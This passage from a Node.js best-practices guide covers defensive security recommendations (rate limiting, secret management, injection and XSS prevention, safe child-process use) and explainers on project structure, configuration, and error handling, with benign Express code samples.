<a href="https://www.owasp.org/index.php/Denial_of_Service" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20DDOS%20-green.svg" alt=""/></a>

**TL;DR:** DOS attacks are very popular and relatively easy to conduct. Implement rate limiting using an external service such as cloud load balancers, cloud firewalls, nginx, [rate-limiter-flexible](https://www.npmjs.com/package/rate-limiter-flexible) package, or (for smaller and less critical apps) a rate-limiting middleware (e.g. [express-rate-limit](https://www.npmjs.com/package/express-rate-limit))

**Otherwise:** An application could be subject to an attack resulting in a denial of service where real users receive a degraded or unavailable service.

🔗 [**Read More: Implement rate limiting**](#limit-concurrent-requests-using-a-balancer-or-a-middleware)

<br/><br/>

## 6.3 Extract secrets from config files or use packages to encrypt them

<a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A6:Security%20Misconfiguration%20-green.svg" alt=""/></a> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A3:Sensitive%20Data%20Exposure%20-green.svg" alt=""/></a>

**TL;DR:** Never store plain-text secrets in configuration files or source code. Instead, make use of secret-management systems like Vault products, Kubernetes/Docker Secrets, or using environment variables. As a last resort, secrets stored in source control must be encrypted and managed (rolling keys, expiring, auditing, etc). Make use of pre-commit/push hooks to prevent committing secrets accidentally

**Otherwise:** Source control, even for private repositories, can mistakenly be made public, at which point all secrets are exposed. Access to source control for an external party will inadvertently provide access to related systems (databases, apis, services, etc).

🔗 [**Read More: Secret management**](#extract-secrets-from-config-files-or-use-npm-package-that-encrypts-them)

<br/><br/>

## 6.4. Prevent query injection vulnerabilities with ORM/ODM libraries

<a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A1:Injection%20-green.svg" alt=""/></a>

**TL;DR:** To prevent SQL/NoSQL injection and other malicious attacks, always make use of an ORM/ODM or a database library that escapes data or supports named or indexed parameterized queries, and takes care of validating user input for expected types. Never just use JavaScript template strings or string concatenation to inject values into queries as this opens your application to a wide spectrum of vulnerabilities. All the reputable Node.js data access libraries (e.g. [Sequelize](https://github.com/sequelize/sequelize), [Knex](https://github.com/tgriesser/knex), [mongoose](https://github.com/Automattic/mongoose)) have built-in protection against injection attacks.

**Otherwise:** Unvalidated or unsanitized user input could lead to operator injection when working with MongoDB for NoSQL, and not using a proper sanitization system or ORM will easily allow SQL injection attacks, creating a giant vulnerability.

🔗 [**Read More: Query injection prevention using ORM/ODM libraries**](#preventing-database-injection-vulnerabilities-by-using-ormodm-libraries-or-other-dal-packages)

<br/><br/>

## 6.5. Collection of generic security best practices

**TL;DR:** This is a collection of security advice that is not related directly to Node.js - the Node implementation is not much different than any other language. Click read more to skim through.

🔗 [**Read More: Common security best practices**](#common-nodejs-security-best-practices)

<br/><br/>

## 6.6. Adjust the HTTP response headers for enhanced security

<a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A6:Security%20Misconfiguration%20-green.svg" alt=""/></a>

**TL;DR:** Your application should be using secure headers to prevent attackers from using common attacks like cross-site scripting (XSS), clickjacking and other malicious attacks. These can be configured easily using modules like [helmet](https://www.npmjs.com/package/helmet).

**Otherwise:** Attackers could perform direct attacks on your application's users, leading to huge security vulnerabilities

🔗 [**Read More: Using secure headers in your application**](#using-security-related-headers-to-secure-your-application-against-common-attacks)

<br/><br/>

## 6.7. Constantly and automatically inspect for vulnerable dependencies

<a href="https://www.owasp.org/index.php/Top_10-2017_A9-Using_Components_with_Known_Vulnerabilities" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A9:Known%20Vulnerabilities%20-green.svg" alt=""/></a>

**TL;DR:** With the npm ecosystem it is common to have many dependencies for a project. Dependencies should always be kept in check as new vulnerabilities are found. Use tools like [npm audit](https://docs.npmjs.com/cli/audit) or [snyk](https://snyk.io/) to track, monitor and patch vulnerable dependencies. Integrate these tools with your CI setup so you catch a vulnerable dependency before it makes it to production.

**Otherwise:** An attacker could detect your web framework and attack all its known vulnerabilities.

🔗 [**Read More: Dependency security**](#use-tools-that-automatically-detect-vulnerable-dependencies)

<br/><br/>

## 6.8. Avoid using the Node.js crypto library for handling passwords, use Bcrypt

<a href="https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A9:Broken%20Authentication%20-green.svg" alt=""/></a>

**TL;DR:** Passwords or secrets (API keys) should be stored using a secure hash + salt function like `bcrypt`, that should be a preferred choice over its JavaScript implementation due to performance and security reasons.

**Otherwise:** Passwords or secrets that are persisted without using a secure function are vulnerable to brute forcing and dictionary attacks that will lead to their disclosure eventually.

🔗 [**Read More: Use Bcrypt**](#avoid-using-the-nodejs-crypto-library-for-passwords-use-bcrypt)

<br/><br/>

## 6.9. Escape HTML, JS and CSS output

<a href="https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A7:XSS%20-green.svg" alt=""/></a>

**TL;DR:** Untrusted data that is sent down to the browser might get executed instead of just being displayed, this is commonly referred as a cross-site-scripting (XSS) attack. Mitigate this by using dedicated libraries that explicitly mark the data as pure content that should never get executed (i.e. encoding, escaping)

**Otherwise:** An attacker might store malicious JavaScript code in your DB which will then be sent as-is to the poor clients

🔗 [**Read More: Escape output**](#escape-output)

<br/><br/>

## 6.10. Validate incoming JSON schemas

<a href="https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A7: XSS%20-green.svg" alt=""/></a> <a href="https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A8:Insecured%20Deserialization%20-green.svg" alt=""/></a>

**TL;DR:** Validate the incoming requests' body payload and ensure it meets expectations, fail fast if it doesn't. To avoid tedious validation coding within each route you may use lightweight JSON-based validation schemas such as [jsonschema](https://www.npmjs.com/package/jsonschema) or [joi](https://www.npmjs.com/package/joi)

**Otherwise:** Your generosity and permissive approach greatly increases the attack surface and encourages the attacker to try out many inputs until they find some combination to crash the application

🔗 [**Read More: Validate incoming JSON schemas**](#validate-the-incoming-json-schemas)

<br/><br/>

## 6.11. Support blacklisting JWTs

<a href="https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A9:Broken%20Authentication%20-green.svg" alt=""/></a>

**TL;DR:** When using JSON Web Tokens (for example, with [Passport.js](https://github.com/jaredhanson/passport)), by default there's no mechanism to revoke access from issued tokens. Once you discover some malicious user activity, there's no way to stop them from accessing the system as long as they hold a valid token. Mitigate this by implementing a blacklist of untrusted tokens that are validated on each request.

**Otherwise:** Expired, or misplaced tokens could be used maliciously by a third party to access an application and impersonate the owner of the token.

🔗 [**Read More: Blacklist JSON Web Tokens**](#support-blacklisting-jwts)

<br/><br/>

## 6.12. Prevent brute-force attacks against authorization

<a href="https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A9:Broken%20Authentication%20-green.svg" alt=""/></a>

**TL;DR:** A simple and powerful technique is to limit authorization attempts using two metrics:
           
1. The first is number of consecutive failed attempts by the same user unique ID/name and IP address.
2. The second is number of failed attempts from an IP address over some long period of time. For example, block an IP address if it makes 100 failed attempts in one day.

**Otherwise:** An attacker can issue unlimited automated password attempts to gain access to privileged accounts on an application

🔗 [**Read More: Login rate limiting**](#prevent-brute-force-attacks-against-authorization)

<br/><br/>

## 6.13. Run Node.js as non-root user

<a href="https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A5:Broken%20Access%20Access%20Control-green.svg" alt=""/></a>

**TL;DR:** There is a common scenario where Node.js runs as a root user with unlimited permissions. For example, this is the default behaviour in Docker containers. It's recommended to create a non-root user and either bake it into the Docker image (examples given below) or run the process on this user's behalf by invoking the container with the flag "-u username"

**Otherwise:** An attacker who manages to run a script on the server gets unlimited power over the local machine (e.g. change iptable and re-route traffic to his server)

🔗 [**Read More: Run Node.js as non-root user**](#run-nodejs-as-non-root-user)

<br/><br/>

## 6.14. Limit payload size using a reverse-proxy or a middleware

<a href="https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A8:Insecured%20Deserialization%20-green.svg" alt=""/></a> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20DDOS%20-green.svg" alt=""/></a>

**TL;DR:** The bigger the body payload is, the harder your single thread works in processing it. This is an opportunity for attackers to bring servers to their knees without tremendous amount of requests (DOS/DDOS attacks). Mitigate this limiting the body size of incoming requests on the edge (e.g. firewall, ELB) or by configuring [express body parser](https://github.com/expressjs/body-parser) to accept only small-size payloads

**Otherwise:** Your application will have to deal with large requests, unable to process the other important work it has to accomplish, leading to performance implications and vulnerability towards DOS attacks

🔗 [**Read More: Limit payload size**](#limit-payload-size-using-a-reverse-proxy-or-a-middleware)

<br/><br/>

## 6.15. Avoid JavaScript eval statements

<a href="https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A7:XSS%20-green.svg" alt=""/></a> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A1:Injection%20-green.svg" alt=""/></a> <a href="https://www.owasp.org/index.php/Top_10-2017_A4-XML_External_Entities_(XXE)" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A4:External%20Entities%20-green.svg" alt=""/></a>

**TL;DR:** `eval` is evil as it allows executing custom JavaScript code during run time. This is not just a performance concern but also an important security concern due to malicious JavaScript code that may be sourced from user input. Another language feature that should be avoided is `new Function` constructor. `setTimeout` and `setInterval` should never be passed dynamic JavaScript code either.

**Otherwise:** Malicious JavaScript code finds a way into text passed into `eval` or other real-time evaluating JavaScript language functions, and will gain complete access to JavaScript permissions on the page. This vulnerability is often manifested as an XSS attack.

🔗 [**Read More: Avoid JavaScript eval statements**](#avoid-js-eval-statements)

<br/><br/>

## 6.16. Prevent evil RegEx from overloading your single thread execution

<a href="https://www.owasp.org/index.php/Denial_of_Service" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20DDOS%20-green.svg" alt=""/></a>

**TL;DR:** Regular Expressions, while being handy, pose a real threat to JavaScript applications at large, and the Node.js platform in particular. A user input for text to match might require an outstanding amount of CPU cycles to process. RegEx processing might be inefficient to an extent that a single request that validates 10 words can block the entire event loop for 6 seconds and set the CPU on 🔥. For that reason, prefer third-party validation packages like [validator.js](https://github.com/chriso/validator.js) instead of writing your own Regex patterns, or make use of [safe-regex](https://github.com/substack/safe-regex) to detect vulnerable regex patterns

**Otherwise:** Poorly written regexes could be susceptible to Regular Expression DoS attacks that will block the event loop completely. For example, the popular `moment` package was found vulnerable with malicious RegEx usage in November of 2017

🔗 [**Read More: Prevent malicious RegEx**](#prevent-malicious-regex-from-overloading-your-single-thread-execution)

<br/><br/>

## 6.17. Avoid module loading using a variable

<a href="https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A7:XSS%20-green.svg" alt=""/></a> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A1:Injection%20-green.svg" alt=""/></a> <a href="https://www.owasp.org/index.php/Top_10-2017_A4-XML_External_Entities_(XXE)" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A4:External%20Entities%20-green.svg" alt=""/></a>

**TL;DR:** Avoid requiring/importing another file with a path that was given as parameter due to the concern that it could have originated from user input. This rule can be extended for accessing files in general (i.e. `fs.readFile()`) or other sensitive resource access with dynamic variables originating from user input. [Eslint-plugin-security](https://www.npmjs.com/package/eslint-plugin-security) linter can catch such patterns and warn early enough

**Otherwise:** Malicious user input could find its way to a parameter that is used to require tampered files, for example, a previously uploaded file on the filesystem, or access already existing system files.

🔗 [**Read More: Safe module loading**](#avoid-module-loading-using-a-variable)

<br/><br/>

## 6.18. Run unsafe code in a sandbox

<a href="https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A7:XSS%20-green.svg" alt=""/></a> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A1:Injection%20-green.svg" alt=""/></a> <a href="https://www.owasp.org/index.php/Top_10-2017_A4-XML_External_Entities_(XXE)" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A4:External%20Entities%20-green.svg" alt=""/></a>

**TL;DR:** When tasked to run external code that is given at run-time (e.g. plugin), use any sort of 'sandbox' execution environment that isolates and guards the main code against the plugin. This can be achieved using a dedicated process (e.g. `cluster.fork()`), serverless environment or dedicated npm packages that act as a sandbox

**Otherwise:** A plugin can attack through an endless variety of options like infinite loops, memory overloading, and access to sensitive process environment variables

🔗 [**Read More: Run unsafe code in a sandbox**](#run-unsafe-code-in-a-sandbox)

<br/><br/>

## 6.19. Take extra care when working with child processes

<a href="https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A7:XSS%20-green.svg" alt=""/></a> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A1:Injection%20-green.svg" alt=""/></a> <a href="https://www.owasp.org/index.php/Top_10-2017_A4-XML_External_Entities_(XXE)" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A4:External%20Entities%20-green.svg" alt=""/></a>

**TL;DR:** Avoid using child processes when possible and validate and sanitize input to mitigate shell injection attacks if you still have to. Prefer using `child_process.execFile` which by definition will only execute a single command with a set of attributes and will not allow shell parameter expansion.

**Otherwise:** Naive use of child processes could result in remote command execution or shell injection attacks due to malicious user input passed to an unsanitized system command.

🔗 [**Read More: Be cautious when working with child processes**](#be-cautious-when-working-with-child-processes)

<br/><br/>

## 6.20. Hide error details from clients

<a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A6:Security%20Misconfiguration%20-green.svg" alt=""/></a>

**TL;DR:** An integrated express error handler hides the error details by default. However, great are the chances that you implement your own error handling logic with custom Error objects (considered by many as a best practice). If you do so, ensure not to return the entire Error object to the client, which might contain some sensitive application details

**Otherwise:** Sensitive application details such as server file paths, third party modules in use, and other internal workflows of the application which could be exploited by an attacker, could be leaked from information found in a stack trace

🔗 [**Read More: Hide error details from client**](#hide-error-details-from-client)

<br/><br/>

## 6.21. Configure 2FA for npm or Yarn

<a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A6:Security%20Misconfiguration%20-green.svg" alt=""/></a>

**TL;DR:** Any step in the development chain should be protected with MFA (multi-factor authentication), npm/Yarn are a sweet opportunity for attackers who can get their hands on some developer's password. Using developer credentials, attackers can inject malicious code into libraries that are widely installed across projects and services. Maybe even across the web if published in public. Enabling 2-factor-authentication in npm leaves almost zero chances for attackers to alter your package code.

**Otherwise:** [Have you heard about the eslint developer who's password was hijacked?](https://medium.com/@oprearocks/eslint-backdoor-what-it-is-and-how-to-fix-the-issue-221f58f1a8c8)

<br/><br/>

## 6.22. Modify session middleware settings

<a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A6:Security%20Misconfiguration%20-green.svg" alt=""/></a>

**TL;DR:** Each web framework and technology has its known weaknesses - telling an attacker which web framework we use is a great help for them. Using the default settings for session middlewares can expose your app to module- and framework-specific hijacking attacks in a similar way to the `X-Powered-By` header. Try hiding anything that identifies and reveals your tech stack (E.g. Node.js, express)

**Otherwise:** Cookies could be sent over insecure connections, and an attacker might use session identification to identify the underlying framework of the web application, as well as module-specific vulnerabilities

🔗 [**Read More: Cookie and session security**](#modify-the-default-session-middleware-settings)

<br/><br/>

## 6.23. Avoid DOS attacks by explicitly setting when a process should crash

<a href="https://www.owasp.org/index.php/Denial_of_Service" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20DDOS%20-green.svg" alt=""/></a>

**TL;DR:** The Node process will crash when errors are not handled. Many best practices even recommend to exit even though an error was caught and got handled. Express, for example, will crash on any asynchronous error - unless you wrap routes with a catch clause. This opens a very sweet attack spot for attackers who recognize what input makes the process crash and repeatedly send the same request. There's no instant remedy for this but a few techniques can mitigate the pain: Alert with critical severity anytime a process crashes due to an unhandled error, validate the input and avoid crashing the process due to invalid user input, wrap all routes with a catch and consider not to crash when an error originated within a request (as opposed to what happens globally)

**Otherwise:** This is just an educated guess: given many Node.js applications, if we try passing an empty JSON body to all POST requests - a handful of applications will crash. At that point, we can just repeat sending the same request to take down the applications with ease

<br/><br/>

## 6.24. Prevent unsafe redirects

<a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A1:Injection%20-green.svg" alt=""/></a>

**TL;DR:** Redirects that do not validate user input can enable attackers to launch phishing scams, steal user credentials, and perform other malicious actions.

**Otherwise:** If an attacker discovers that you are not validating external, user-supplied input, they may exploit this vulnerability by posting specially-crafted links on forums, social media, and other public places to get users to click it.

🔗 [**Read More: Prevent unsafe redirects**](#prevent-unsafe-redirects)

<br/><br/>

## 6.25. Avoid publishing secrets to the npm registry

<a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A6:Security%20Misconfiguration%20-green.svg" alt=""/></a>

**TL;DR:** Precautions should be taken to avoid the risk of accidentally publishing secrets to public npm registries. An `.npmignore` file can be used to blacklist specific files or folders, or the `files` array in `package.json` can act as a whitelist.

**Otherwise:** Your project's API keys, passwords or other secrets are open to be abused by anyone who comes across them, which may result in financial loss, impersonation, and other risks.

🔗 [**Read More: Avoid publishing secrets**](#avoid-publishing-secrets-to-the-npm-registry)
<br/><br/><br/>

<p align="right"><a href="#table-of-contents">⬆ Return to top</a></p>

# `7. Performance Best Practices`

## 7.1. Prefer native JS methods over user-land utils like Lodash

 **TL;DR:** It's often more penalising to use utility libraries like `lodash` and `underscore` over native methods as it leads to unneeded dependencies and slower performance.
 Bear in mind that with the introduction of the new V8 engine alongside the new ES standards, native methods were improved in such a way that it's now about 50% more performant than utility libraries.

**Otherwise:** You'll have to maintain less performant projects where you could have simply used what was **already** available or dealt with a few more lines in exchange of a few more files.

🔗 [**Read More: Native over user land utils**](#prefer-native-js-methods-over-user-land-utils-like-lodash)

<br/><br/><br/>

# Read More Section

# `Project File Structure`

[private_npm]: assets/images/Privatenpm.png
# `Wrap common utilities as npm packages`

<br/><br/>

### One Paragraph Explainer

Once you start growing and have different components on different servers which consumes similar utilities, you should start managing the dependencies - how can you keep 1 copy of your utility code and let multiple consumer components use and deploy it? well, there is a tool for that, it's called npm... Start by wrapping 3rd party utility packages with your own code to make it easily replaceable in the future and publish your own code as private npm package. Now, all your code base can import that code and benefit free dependency management tool. It's possible to publish npm packages for your own private use without sharing it publicly using [private modules](https://docs.npmjs.com/private-modules/intro), [private registry](https://npme.npmjs.com/docs/tutorials/npm-enterprise-with-nexus.html) or [local npm packages](https://medium.com/@arnaudrinquin/build-modular-application-with-npm-local-modules-dfc5ff047bcc)

<br/><br/>

### Sharing your own common utilities across environments and components

![private_npm]

<br></br>

# `Separate Express app and server`

<br/><br/>

### One Paragraph Explainer

The latest Express generator comes with a great practice that is worth to keep - the API declaration is separated from the network related configuration (port, protocol, etc). This allows testing the API in-process, without performing network calls, with all the benefits that it brings to the table: fast testing execution and getting coverage metrics of the code. It also allows deploying the same API under flexible and different network conditions. Bonus: better separation of concerns and cleaner code

<br/><br/>

### Code example: API declaration, should reside in app.js

```javascript
var app = express();
app.use(bodyParser.json());
app.use("/api/events", events.API);
app.use("/api/forms", forms);
```

<br/><br/>

### Code example: Server network declaration, should reside in /bin/www

```javascript
var app = require('../app');
var http = require('http');

/**
 * Get port from environment and store in Express.
 */

var port = normalizePort(process.env.PORT || '3000');
app.set('port', port);

/**
 * Create HTTP server.
 */

var server = http.createServer(app);
```

### Example: test your API in-process using supertest (popular testing package)

```javascript
const app = express();

app.get('/user', function(req, res) {
  res.status(200).json({ name: 'tobi' });
});

request(app)
  .get('/user')
  .expect('Content-Type', /json/)
  .expect('Content-Length', '15')
  .expect(200)
  .end(function(err, res) {
    if (err) throw err;
  });
````

<br></br>

# `Use environment aware, secure and hierarchical config`

<br/><br/>

### One Paragraph Explainer

When dealing with configuration data, many things can just annoy and slow down:

1. setting all the keys using process environment variables becomes very tedious when in need to inject 100 keys (instead of just committing those in a config file), however when dealing with files only the DevOps admins cannot alter the behavior without changing the code. A reliable config solution must combine both configuration files + overrides from the process variables

2. when specifying all keys in a flat JSON, it becomes frustrating to find and modify entries when the list grows bigger. A hierarchical JSON file that is grouped into sections can overcome this issue + few config libraries allow to store the configuration in multiple files and take care to union all at runtime. See example below

3. storing sensitive information like DB password is obviously not recommended but no quick and handy solution exists for this challenge. Some configuration libraries allow to encrypt files, others encrypt those entries during GIT commits or simply don't store real values for those entries and specify the actual value during deployment via environment variables.

4. some advanced configuration scenarios demand to inject configuration values via command line (vargs) or sync configuration info via a centralized cache like Redis so multiple servers will use the same configuration data.

Some configuration libraries can provide most of these features for free, have a look at npm libraries like [rc](https://www.npmjs.com/package/rc), [nconf](https://www.npmjs.com/package/nconf) and [config](https://www.npmjs.com/package/config) which tick many of these requirements.

<br/><br/>

### Code Example – hierarchical config helps to find entries and maintain huge config files

```js
{
  // Customer module configs 
  "Customer": {
    "dbConfig": {
      "host": "localhost",
      "port": 5984,
      "dbName": "customers"
    },
    "credit": {
      "initialLimit": 100,
      // Set low for development 
      "initialDays": 1
    }
  }
}
```

<br/><br/>

# `Use Async-Await or promises for async error handling`

### One Paragraph Explainer

Callbacks don’t scale well since most programmers are not familiar with them. They force to check errors all over, deal with nasty code nesting and make it difficult to reason about the code flow. Promise libraries like BlueBird, async, and Q pack a standard code style using RETURN and THROW to control the program flow. Specifically, they support the favorite try-catch error handling style which allows freeing the main code path from dealing with errors in every function

### Code Example – using promises to catch errors

```javascript
return functionA()
  .then((valueA) => functionB(valueA))
  .then((valueB) => functionC(valueB))
  .then((valueC) => functionD(valueC))
  .catch((err) => logger.error(err))
  .then(alwaysExecuteThisFunction())
```

### Code Example - using async/await to catch errors

```javascript
async function executeAsyncTask () {
  try {
    const valueA = await functionA();
    const valueB = await functionB(valueA);
    const valueC = await functionC(valueB);
    return await functionD(valueC);
  }
  catch(err) {
    logger.error(err);
  }
}
```

### Anti pattern code example – callback style error handling

```javascript
getData(someParameter, function(err, result) {
    if(err !== null) {
        // do something like calling the given callback function and pass the error
        getMoreData(a, function(err, result) {
            if(err !== null) {
                // do something like calling the given callback function and pass the error
                getMoreData(b, function(c) {
                    getMoreData(d, function(e) {
                        if(err !== null ) {
                            // you get the idea? 
                        }
                    })
                });
            }
        });
    }
});
```

### Blog Quote: "We have a problem with promises"

 From the blog pouchdb.com

 > ……And in fact, callbacks do something even more sinister: they deprive us of the stack, which is something we usually take for granted in programming languages. Writing code without a stack is a lot like driving a car without a brake pedal: you don’t realize how badly you need it until you reach for it and it’s not there. The whole point of promises is to give us back the language fundamentals we lost when we went async: return, throw, and the stack. But you have to know how to use promises correctly in order to take advantage of them.

### Blog Quote: "The promises method is much more compact"

 From the blog gosquared.com

 > ………The promises method is much more compact, clearer and quicker to write. If an error or exception occurs within any of the ops it is handled by the single .catch() handler. Having this single place to handle all errors means you don’t need to write error checking for each stage of the work.

### Blog Quote: "Promises are native ES6, can be used with generators"

 From the blog StrongLoop

 > ….Callbacks have a lousy error-handling story. Promises are better. Marry the built-in error handling in Express with promises and significantly lower the chances of an uncaught exception. Promises are native ES6, can be used with generators, and ES7 proposals like async/await through compilers like Babel

### Blog Quote: "All those regular flow control constructs you are used to are completely broken"

From the blog Benno’s

 > ……One of the best things about asynchronous, callback-based programming is that basically all those regular flow control constructs you are used to are completely broken. However, the one I find most broken is the handling of exceptions. Javascript provides a fairly familiar try…catch construct for dealing with exceptions. The problem with exceptions is that they provide a great way of short-cutting errors up a call stack, but end up being completely useless if the error happens on a different stack…

<br></br>

# `Use only the built-in Error object`

### One Paragraph Explainer

The permissive nature of JavaScript along with its variety of code-flow options (e.g. EventEmitter, Callbacks, Promises, etc) pushes to great variance in how developers raise errors – some use strings, other define their own custom types. Using Node.js built-in Error object helps to keep uniformity within your code and with 3rd party libraries, it also preserves significant information like the StackTrace. When raising the exception, it’s usually a good practice to fill it with additional contextual properties like the error name and the associated HTTP error code. To achieve this uniformity and practices, consider extending the Error object with additional properties, see code example below

### Code Example – doing it right

```javascript
// throwing an Error from typical function, whether sync or async
if(!productToAdd)
    throw new Error("How can I add new product when no value provided?");

// 'throwing' an Error from EventEmitter
const myEmitter = new MyEmitter();
myEmitter.emit('error', new Error('whoops!'));

// 'throwing' an Error from a Promise
const addProduct = async (productToAdd) => {
  try {
    const existingProduct = await DAL.getProduct(productToAdd.id);
    if (existingProduct !== null) {
      throw new Error("Product already exists!");
    }
  } catch (err) {
    // ...
  }
}
```

### Code example – Anti Pattern

```javascript
// throwing a string lacks any stack trace information and other important data properties
if(!productToAdd)
    throw ("How can I add new product when no value provided?");
```

### Code example – doing it even better

```javascript
// centralized error object that derives from Node’s Error
function AppError(name, httpCode, description, isOperational) {
    Error.call(this);
    Error.captureStackTrace(this);
    this.name = name;
    //...other properties assigned here
};

AppError.prototype.__proto__ = Error.prototype;

module.exports.AppError = AppError;

// client throwing an exception
if(user == null)
    throw new AppError(commonErrors.resourceNotFound, commonHTTPErrors.notFound, "further explanation", true)
```

### Blog Quote: "I don’t see the value in having lots of different types"

From the blog, Ben Nadel ranked 5 for the keywords “Node.js error object”

>…”Personally, I don’t see the value in having lots of different types of error objects – JavaScript, as a language, doesn’t seem to cater to Constructor-based error-catching. As such, differentiating on an object property seems far easier than differentiating on a Constructor type…

### Blog Quote: "A string is not an error"

From the blog, devthought.com ranked 6 for the keywords “Node.js error object”

> …passing a string instead of an error results in reduced interoperability between modules. It breaks contracts with APIs that might be performing `instanceof` Error checks, or that want to know more about the error. Error objects, as we’ll see, have very interesting properties in modern JavaScript engines besides holding the message passed to the constructor…

### Blog Quote: "Inheriting from Error doesn’t add too much value"

From the blog machadogj

> …One problem that I have with the Error class is that is not so simple to extend. Of course, you can inherit the class and create your own Error classes like HttpError, DbError, etc. However, that takes time and doesn’t add too much value unless you are doing something with types. Sometimes, you just want to add a message and keep the inner error, and sometimes you might want to extend the error with parameters, and such…

### Blog Quote: "All JavaScript and System errors raised by Node.js inherit from Error"

From Node.js official documentation

> …All JavaScript and System errors raised by Node.js inherit from, or are instances of, the standard JavaScript Error class and are guaranteed to provide at least the properties available on that class. A generic JavaScript Error object that does not denote any specific circumstance of why the error occurred. Error objects capture a “stack trace” detailing the point in the code at which the Error was instantiated, and may provide a text description of the error. All errors generated by Node.js, including all System and JavaScript errors, will either be instances of or inherit from, the Error class…

<br></br>

# `Distinguish operational vs programmer errors`

### One Paragraph Explainer

Distinguishing the following two error types will minimize your app downtime and helps avoid crazy bugs: Operational errors refer to situations where you understand what happened and the impact of it – for example, a query to some HTTP service failed due to connection problem. On the other hand, programmer errors refer to cases where you have no idea why and sometimes where an error came from – it might be some code that tried to read an undefined value or DB connection pool that leaks memory. Operational errors are relatively easy to handle – usually logging the error is enough. Things become hairy when a programmer error pops up, the application might be in an inconsistent state and there’s nothing better you can do than to restart gracefully

### Code Example – marking an error as operational (trusted)

```javascript
// marking an error object as operational 
const myError = new Error("How can I add new product when no value provided?");
myError.isOperational = true;

// or if you're using some centralized error factory (see other examples at the bullet "Use only the built-in Error object")
class AppError {
  constructor (commonType, description, isOperational) {
    Error.call(this);
    Error.captureStackTrace(this);
    this.commonType = commonType;
    this.description = description;
    this.isOperational = isOperational;
  }
};

throw new AppError(errorManagement.commonErrors.InvalidInput, "Describe here what happened", true);

```

